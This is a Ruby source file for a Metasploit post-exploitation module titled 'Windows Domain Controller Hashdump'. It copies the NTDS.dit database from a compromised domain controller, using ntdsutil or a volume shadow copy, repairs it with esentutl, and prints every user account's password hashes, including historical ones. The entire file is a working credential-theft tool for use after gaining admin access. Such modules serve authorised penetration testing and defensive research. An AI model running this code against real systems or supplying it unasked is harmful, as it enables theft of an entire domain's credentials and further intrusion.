##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'
require 'metasploit/framework/ntds/parser'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::ShadowCopy

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Domain Controller Hashdump',
      'Description'   => %q{
        This module attempts to copy the NTDS.dit database from a live Domain Controller
        and then parse out all of the User Accounts. It saves all of the captured password
        hashes, including historical ones.
  },
      'License'       => MSF_LICENSE,
      'Author'        => ['theLightCosine'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
  ))
  end

  def run
    if preconditions_met?
      ntds_file = copy_database_file
      unless ntds_file.nil?
        print_status "Repairing NTDS database after copy..."
        print_status repair_ntds(ntds_file)
        ntds_parser = Metasploit::Framework::NTDS::Parser.new(client, ntds_file)
        ntds_parser.each_account do |ad_account|
          print_good ad_account.to_s
        end
      end
    end
  end

  def copy_database_file
    database_file_path = nil
    if start_vss
      case  sysinfo["OS"]
        when /2003| \.NET/
          database_file_path = vss_method
        when /2008|2012/
          database_file_path = ntdsutil_method
        else
          print_error "This version of Windows is unsupported"
      end
    end
    database_file_path
  end

  def is_domain_controller?
    status = false
    if session.fs.file.exists?('%SystemDrive%\Windows\ntds\ntds.dit')
      status = true
    end
    status
  end

  def ntdsutil_method
    tmp_path = "#{expand_path("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
    command_arguments = "\"activate instance ntds\" \"ifm\" \"Create Full #{tmp_path}\" quit quit"
    result = cmd_exec("ntdsutil.exe", command_arguments)
    if result.include? "IFM media created successfully"
      file_path = "#{tmp_path}\\Active Directory\\ntds.dit"
      print_status "NTDS database copied to #{file_path}"
    else
      print_error "There was an error copying the ntds.dit file!"
      vprint_error result
      file_path = nil
    end
    file_path
  end


  def preconditions_met?
    status = true
    unless is_domain_controller?
      print_error "This does not appear to be an AD Domain Controller"
      status = false
    end
    unless is_admin?
      print_error "This module requires Admin privs to run"
      status = false
    end
    if is_uac_enabled?
      print_error "This module requires UAC to be bypassed first"
      status = false
    end
    return status
  end

  def repair_ntds(path='')
    arguments = "/p /o \"#{path}\""
    cmd_exec("esentutl", arguments)
  end

  def vss_method
    id = create_shadowcopy("#{expand_path("%SystemDrive%")}\\")
    sc_details = get_sc_details(id)
    sc_path = "#{sc_details['DeviceObject']}\\windows\\ntds\\ntds.dit"
    target_path = "#{expand_path("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
    copy_command = "/c copy #{sc_path} #{target_path}"
    result = cmd_exec('cmd.exe', copy_command)
    if result =~ /1 file\(s\) copied/
      return target_path
    else
      return nil
    end
  end

end
